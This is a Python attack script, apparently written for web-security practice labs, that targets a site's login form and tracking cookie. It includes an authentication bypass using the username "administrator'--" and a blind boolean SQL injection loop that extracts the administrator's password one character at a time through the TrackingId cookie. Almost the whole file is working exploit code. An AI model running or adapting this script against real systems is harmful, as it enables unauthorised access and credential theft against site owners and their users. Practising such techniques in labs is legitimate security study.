import requests
import difflib
from bs4 import BeautifulSoup

session = requests.Session()
CHAR_LIST = list("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

base_url = 'url'

def post_injection():
    resp = session.get(base_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    payload = {
        'csrf': csrf_token,
        'username': "administrator'--",
        'password': "test"
    }

    response = session.post(base_url, data=payload)

    print(response.status_code)
    print(response.text)
    print(response.url)
    print(response.history)

def simple_sql_injection():
    url_response = session.get(base_url)
    text1 = url_response.text.splitlines()

    sql_injection = "sql injection"
    replaced = sql_injection.replace(" ","%20")
    injection = base_url+replaced
    injection_request = session.get(injection)
    text2= injection_request.text.splitlines()

    diff = difflib.ndiff(text1, text2)

    for lines in diff:
        if lines.startswith('+'):
            print(lines)

def show_text():
    url_response = session.get(base_url)
    print(url_response.text)
    print(url_response.cookies)


def payload_inj(lang_pass, username):
    url_response = session.get(base_url)
    cookies = url_response.cookies

    tracking_id_cookies = cookies["TrackingId"]
    session_id = cookies["session"]
    res = ""

    for i in range(1, lang_pass + 1):
        for j in CHAR_LIST:
            payload = f"{tracking_id_cookies}' AND SUBSTRING((SELECT password FROM users WHERE username = '{username}'), {i}, 1) = '{j}'--"

            cookies_injection = {
                "TrackingId": payload,
                "session": session_id
            }
            try:
                response = session.get(base_url, cookies=cookies_injection)

                if "Welcome back!" in response.text:
                    res += j
                    print(f"[+] Latter find {i}: {j} | Password: {res}")
                    break

            except requests.exceptions.RequestException as e:
                print(e)

        else:
            print("Can't find a latter")
            break




if __name__ == "__main__":
    payload_inj(20, "administrator")